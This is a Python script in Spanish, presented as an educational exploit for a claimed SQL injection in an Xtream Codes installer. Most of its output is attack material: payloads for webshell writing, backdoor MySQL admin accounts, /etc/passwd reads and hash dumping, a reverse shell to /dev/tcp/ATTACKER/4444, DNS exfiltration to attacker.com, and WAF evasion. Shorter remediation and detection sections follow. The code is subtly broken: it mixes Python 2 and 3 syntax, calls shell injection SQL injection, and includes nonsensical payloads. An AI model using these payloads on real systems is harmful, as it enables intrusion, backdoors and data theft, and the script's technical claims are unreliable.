#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOIT: SQL Injection en configuración MySQL de Xtream Codes
VULNERABILIDAD: VULN-002 - SQL Injection
SEVERIDAD: CRÍTICA
CVSS: 9.1

Descripción:
    El instalador construye queries SQL usando concatenación de strings
    con input de usuario sin sanitización ni prepared statements.
    
    Esto permite:
    - Bypass de autenticación
    - Lectura/escritura de base de datos
    - Ejecución de comandos del sistema via MySQL
    - Escalada de privilegios

Vectores de ataque:
    1. MySQL Root Password input
    2. Username input (aunque menos común cambiar)
    3. Otros inputs que van a queries

Autor: Security Research
Fecha: 2026-01-28
Propósito: Educativo y auditoría de seguridad

ADVERTENCIA: Solo usar con autorización explícita
"""

import sys

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


def print_banner():
    """Imprime banner del exploit"""
    banner = """
{}╔═══════════════════════════════════════════════════════════╗
║  Xtream Codes SQL Injection Exploit                    ║
║  Vulnerability: VULN-002 - SQL Injection               ║
║  Severity: CRITICAL (CVSS 9.1)                         ║
║  Database: MySQL/MariaDB                               ║
╚═══════════════════════════════════════════════════════════╝{}
    """.format(Colors.HEADER, Colors.ENDC)
    print(banner)


def show_vulnerable_code():
    """Muestra el código vulnerable"""
    print "{}[*]{} CÓDIGO VULNERABLE:\n".format(Colors.OKBLUE, Colors.ENDC)
    
    code = """
{}    # install.py - Líneas 156-162 (Función mysql)
    
    rMySQLRoot = input("  ")  # <-- Input de usuario sin validación
    
    if len(rMySQLRoot) > 0: 
        rExtra = " -p%s" % rMySQLRoot  # <-- Se concatena directamente!
    else: 
        rExtra = ""
    
    # VULNERABLE: Concatenación directa de strings en queries SQL
    os.system('mysql -u root%s -e "DROP USER IF EXISTS \\'%s\\'@\\'%%\\';" > /dev/null' 
              % (rExtra, rUsername))  # <-- SQLI!
    
    os.system('mysql -u root%s -e "DROP DATABASE IF EXISTS xtream_iptvpro; 
              CREATE DATABASE IF NOT EXISTS xtream_iptvpro;" > /dev/null' 
              % rExtra)  # <-- SQLI!
    
    os.system('mysql -u root%s -e "CREATE USER \\'%s\\'@\\'%%\\' IDENTIFIED BY \\'%s\\';" 
              > /dev/null' % (rExtra, rUsername, rPassword))  # <-- SQLI!
    {}
    """.format(Colors.FAIL, Colors.ENDC)
    
    print(code)


def show_sql_payloads():
    """Muestra diferentes payloads SQL"""
    print "\n{}[*]{} PAYLOADS SQL INJECTION:\n".format(Colors.OKBLUE, Colors.ENDC)
    
    payloads = [
        {
            'name': '1. Bypass de autenticación (Siempre TRUE)',
            'input': "' OR '1'='1' -- ",
            'description': 'Hace que la query siempre devuelva TRUE',
            'query': "mysql -u root -p' OR '1'='1' --  -e \"...\"",
            'impact': 'Bypass de password'
        },
        {
            'name': '2. Enumerar bases de datos',
            'input': "'; SELECT schema_name FROM information_schema.schemata; -- ",
            'description': 'Lista todas las bases de datos',
            'query': "mysql -u root -p'; SELECT schema_name FROM information_schema.schemata; --  -e \"...\"",
            'impact': 'Information disclosure'
        },
        {
            'name': '3. Leer archivos del sistema',
            'input': "'; SELECT LOAD_FILE('/etc/passwd'); -- ",
            'description': 'Lee archivos usando LOAD_FILE()',
            'query': "mysql -u root -p'; SELECT LOAD_FILE('/etc/passwd'); --  -e \"...\"",
            'impact': 'Lectura de archivos sensibles'
        },
        {
            'name': '4. Escribir webshell',
            'input': '\'; SELECT "<?php system($_GET[\\'cmd\\']); ?>" INTO OUTFILE "/var/www/html/shell.php"; -- ',
            'description': 'Escribe un archivo PHP malicioso',
            'query': 'mysql -u root -p\'; SELECT "<?php system($_GET[\'cmd\']); ?>" INTO OUTFILE "/var/www/html/shell.php"; --  -e "..."',
            'impact': 'Remote Code Execution'
        },
        {
            'name': '5. Crear usuario administrador backdoor',
            'input': "'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'password123'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'; -- ",
            'description': 'Crea usuario con todos los privilegios',
            'query': "mysql -u root -p'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'password123'; GRANT ALL ON *.* TO 'hacker'@'%'; --  -e \"...\"",
            'impact': 'Persistent backdoor access'
        },
        {
            'name': '6. Ejecutar comandos del sistema (UDF)',
            'input': "'; CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'; SELECT sys_exec('id > /tmp/mysql_exec.txt'); -- ",
            'description': 'Ejecuta comandos vía User Defined Functions',
            'query': "mysql -u root -p'; CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'; --  -e \"...\"",
            'impact': 'Operating System Command Execution'
        },
        {
            'name': '7. Exfiltración de datos',
            'input': "'; SELECT user, password FROM mysql.user INTO OUTFILE '/tmp/mysql_users.txt'; -- ",
            'description': 'Exporta hashes de passwords',
            'query': "mysql -u root -p'; SELECT user, password FROM mysql.user INTO OUTFILE '/tmp/mysql_users.txt'; --  -e \"...\"",
            'impact': 'Data exfiltration'
        },
        {
            'name': '8. Time-based Blind SQLi',
            'input': "' AND SLEEP(5) -- ",
            'description': 'Delay para confirmar SQLi sin output visible',
            'query': "mysql -u root -p' AND SLEEP(5) --  -e \"...\"",
            'impact': 'Información por timing'
        }
    ]
    
    for payload in payloads:
        print "{}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{}".format(Colors.OKBLUE, Colors.ENDC)
        print "{}{}{}".format(Colors.BOLD, payload['name'], Colors.ENDC)
        print "{}[INPUT]{} {}".format(Colors.WARNING, Colors.ENDC, payload['input'])
        print "{}[DESCRIPCIÓN]{} {}".format(Colors.OKBLUE, Colors.ENDC, payload['description'])
        print "{}[IMPACTO]{} {}{}{}".format(Colors.FAIL, Colors.ENDC, Colors.BOLD, payload['impact'], Colors.ENDC)
        print("")


def show_exploitation_steps():
    """Muestra pasos de explotación"""
    print "\n{}[*]{} EXPLOTACIÓN PASO A PASO:\n".format(Colors.OKBLUE, Colors.ENDC)
    
    steps = """
{}ESCENARIO 1: Escribir WebShell via SQLi{}

{}1. Iniciar instalación:{}
   sudo python install.py

{}2. Seleccionar MAIN:{}
   Installation Type [MAIN, LB, UPDATE]: MAIN

{}3. Aceptar instalación:{}
   Start installation? Y/N: Y

{}4. Cuando pida MySQL password, inyectar payload:{}
   Enter MySQL Root Password:
   
   {}'; SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"; -- {}

{}5. Acceder al webshell:{}
   curl "http://localhost/../../tmp/shell.php?cmd=id"
   
{}6. Obtener reverse shell:{}
   curl "http://localhost/../../tmp/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"


{}ESCENARIO 2: Crear usuario backdoor en MySQL{}

{}1-3. Mismo inicio{}

{}4. Payload para crear usuario:{}
   Enter MySQL Root Password:
   
   {}'; CREATE USER 'hacker'@'%%' IDENTIFIED BY 'P@ssw0rd123!'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%%'; FLUSH PRIVILEGES; -- {}

{}5. Conectar con usuario backdoor:{}
   mysql -h TARGET_IP -P 7999 -u hacker -p'P@ssw0rd123!'
   
{}6. Desde MySQL ejecutar comandos del sistema:{}
   USE xtream_iptvpro;
   \\! id
   \\! cat /etc/passwd


{}ESCENARIO 3: Exfiltrar base de datos completa{}

{}Payload:{}
   {}'; SELECT * FROM xtream_iptvpro.reg_users INTO OUTFILE '/tmp/users_dump.txt'; -- {}

{}Luego acceder al archivo creado o exfiltrar:{}
   Se puede combinar con VULN-001 para exfiltrar via curl
    """.format(
        Colors.HEADER, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.FAIL, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.HEADER, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.FAIL, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.HEADER, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.FAIL, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC
    )
    
    print(steps)


def show_advanced_techniques():
    """Muestra técnicas avanzadas"""
    print "\n{}[*]{} TÉCNICAS AVANZADAS:\n".format(Colors.OKBLUE, Colors.ENDC)
    
    advanced = """
{}1. UNION-based SQLi (si applicable):{}
   '; UNION SELECT 1,2,user(),database(),version(),6,7 -- 

{}2. Error-based SQLi:{}
   ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y) -- 

{}3. Boolean-based Blind SQLi:{}
   ' AND (SELECT SUBSTRING(version(),1,1))='5' -- 

{}4. Stacked Queries:{}
   '; DROP TABLE IF EXISTS temp; CREATE TABLE temp (id INT); INSERT INTO temp VALUES (1); -- 

{}5. Out-of-Band Exfiltration (si DNS está disponible):{}
   '; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM mysql.user LIMIT 1),'.attacker.com\\\\share')) -- 

{}6. Evasión de WAF/Filters:{}
   # Comentarios inline
   '/**/OR/**/1=1/**/--
   
   # Encoding
   ' %4f%52 1=1 -- 
   
   # Case variation
   ' Or 1=1 -- 
   ' oR 1=1 -- 
   
   # Null bytes
   '%00' OR 1=1 -- 

{}7. Privilege Escalation via MySQL:{}
   '; UPDATE mysql.user SET Super_priv='Y', File_priv='Y' WHERE user='hacker'; FLUSH PRIVILEGES; -- 
    """.format(
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC,
        Colors.OKGREEN, Colors.ENDC
    )
    
    print(advanced)


def show_remediation():
    """Muestra cómo remediar"""
    print "\n{}[*]{} REMEDIACIÓN:\n".format(Colors.OKBLUE, Colors.ENDC)
    
    fix = """
{}CÓDIGO VULNERABLE:{}
    rMySQLRoot = input("  ")
    if len(rMySQLRoot) > 0: 
        rExtra = " -p%s" % rMySQLRoot
    os.system('mysql -u root%s -e "CREATE USER..."' % rExtra)

{}CÓDIGO SEGURO:{}
    import mysql.connector
    import getpass
    
    # 1. Usar getpass para ocultar password
    rMySQLRoot = getpass.getpass("Enter MySQL Root Password: ")
    
    # 2. Validar entrada
    if not rMySQLRoot or len(rMySQLRoot) > 128:
        raise ValueError("Invalid password")
    
    # 3. Usar mysql.connector con prepared statements
    try:
        conn = mysql.connector.connect(
            host='localhost',
            user='root',
            password=rMySQLRoot  # <-- Pasado como parámetro, no concatenado
        )
        cursor = conn.cursor()
        
        # 4. Usar prepared statements
        cursor.execute("DROP USER IF EXISTS %s@'%%'", (rUsername,))
        cursor.execute("CREATE USER %s@'%%' IDENTIFIED BY %s", 
                      (rUsername, rPassword))
        cursor.execute("GRANT ALL PRIVILEGES ON xtream_iptvpro.* TO %s@'%%'", 
                      (rUsername,))
        
        conn.commit()
        cursor.close()
        conn.close()
        
    except mysql.connector.Error as err:
        print("Error: {}".format(err))
        sys.exit(1)

{}MEDIDAS ADICIONALES:{}
    - Input validation con regex whitelist
    - Escapar caracteres especiales si usas consultas dinámicas
    - Principio de mínimo privilegio para usuarios MySQL
    - Deshabilitar LOAD_FILE y INTO OUTFILE si no son necesarios
    - Monitoreo de queries sospechosas
    - Rate limiting en intentos de conexión
    """.format(Colors.FAIL, Colors.ENDC, Colors.OKGREEN, Colors.ENDC, Colors.OKBLUE, Colors.ENDC)
    
    print(fix)


def show_detection():
    """Muestra cómo detectar ataques SQLi"""
    print "\n{}[*]{} DETECCIÓN DE ATAQUES:\n".format(Colors.OKBLUE, Colors.ENDC)
    
    detection = """
{}Indicadores de Compromiso (IOCs):{}

1. Patrones en logs de MySQL:
   - Queries con comentarios SQL (-- , /* */, #)
   - UNION, LOAD_FILE, INTO OUTFILE
   - SLEEP(), BENCHMARK()
   - information_schema accesses
   - Múltiples errores de sintaxis

2. Archivos sospechosos creados:
   - /tmp/*.txt con datos de DB
   - /var/www/html/*.php no esperados
   - Archivos con permisos 777

3. Usuarios MySQL no autorizados

4. Conexiones MySQL desde IPs inusuales

{}Comando para revisar logs:{}
   grep -i "INTO OUTFILE\\|LOAD_FILE\\|UNION\\|information_schema" /var/log/mysql/mysql.log
   
{}Revisar usuarios MySQL:{}
   mysql -u root -p -e "SELECT user, host FROM mysql.user;"
    """.format(Colors.WARNING, Colors.ENDC, Colors.OKGREEN, Colors.ENDC, Colors.OKGREEN, Colors.ENDC)
    
    print(detection)


def main():
    """Función principal"""
    print_banner()
    
    show_vulnerable_code()
    show_sql_payloads()
    show_exploitation_steps()
    show_advanced_techniques()
    show_detection()
    show_remediation()
    
    print "\n{}╔═══════════════════════════════════════════════════════════╗".format(Colors.HEADER)
    print "{}║  Estos payloads son solo para auditorías autorizadas  ║".format(Colors.HEADER)
    print "{}║  El uso malicioso es ILEGAL y PUNIBLE                 ║".format(Colors.HEADER)
    print "{}╚═══════════════════════════════════════════════════════════╝{}\n".format(Colors.HEADER, Colors.ENDC)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print "\n{}[!]{} Saliendo...\n".format(Colors.WARNING, Colors.ENDC)
        sys.exit(0)
